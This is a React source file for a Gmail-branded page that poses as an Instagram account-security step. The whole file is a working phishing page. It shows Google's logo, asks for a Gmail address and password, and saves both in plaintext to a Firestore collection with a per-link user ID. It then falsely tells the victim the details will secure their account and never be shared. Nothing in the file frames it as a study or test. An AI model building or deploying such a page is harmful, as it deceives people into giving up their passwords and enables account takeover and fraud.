import React, { useState } from 'react';
import { db } from '../firebase';  // Firebase Firestore instance
import { collection, addDoc } from 'firebase/firestore';
import { useParams } from 'react-router-dom';  // Import the useParams hook
import { FaGoogle, FaLock } from 'react-icons/fa';  // Icons for better UI

const GmailLogin = () => {
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });
  const [message, setMessage] = useState({ text: '', type: '' });
  const [loading, setLoading] = useState(false);
  const { userId } = useParams();  // Get userId from the URL

  // Handle form input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage({ text: '', type: '' });

    if (!formData.email || !formData.password) {
      setMessage({ text: 'Both email and password are required.', type: 'error' });
      setLoading(false);
      return;
    }

    if (!userId) {
      setMessage({ text: 'User ID is missing. Unable to process the request.', type: 'error' });
      setLoading(false);
      return;
    }

    try {
      // Save the email and password data to Firestore, along with the userId from URL params
      await addDoc(collection(db, 'submissions'), {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });

      setMessage({ text: 'Your Gmail details were submitted successfully! This will help secure your Instagram account.', type: 'success' });
      setFormData({ email: '', password: '' });
    } catch (error) {
      console.error('Error adding document: ', error);
      setMessage({ text: 'There was an error submitting your data. Please try again later.', type: 'error' });
    }
    setLoading(false);
  };

  return (
    <div className="bg-white shadow-lg p-6 rounded-lg w-full max-w-md mx-auto mt-10">
      <div className="text-center mb-8">
        <img
          src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico"
          alt="Gmail Logo"
          className="w-12 h-12 mx-auto"
        />
        <h2 className="text-3xl font-bold text-gray-800 mb-2">Secure Your Instagram Account</h2>
        <p className="text-gray-500">We need your Gmail details to help secure your Instagram account.</p>
      </div>

      {/* Gmail-style login form */}
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <FaGoogle className="absolute top-3 left-4 text-gray-400" />
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
            required
            className="w-full px-12 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
            placeholder="Gmail"
          />
        </div>
        <div className="relative">
          <FaLock className="absolute top-3 left-4 text-gray-400" />
          <input
            type="password"
            name="password"
            value={formData.password}
            onChange={handleInputChange}
            required
            className="w-full px-12 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 transition"
            placeholder="Password"
          />
        </div>

        {message.text && (
          <p className={`text-sm text-center ${message.type === 'error' ? 'text-red-500' : 'text-green-500'}`}>
            {message.text}
          </p>
        )}

        <button
          type="submit"
          className={`w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3 rounded-md hover:bg-blue-700 transition duration-300 ${
            loading ? 'opacity-50 cursor-not-allowed' : ''
          }`}
          disabled={loading}
        >
          {loading ? 'Submitting...' : 'Secure with Gmail'}
        </button>
      </form>

      <div className="text-center mt-6">
        <p className="text-gray-500 text-sm">
          We use your Gmail credentials to verify and secure your Instagram account. Your details will never be shared.
        </p>
      </div>
    </div>
  );
};

export default GmailLogin;
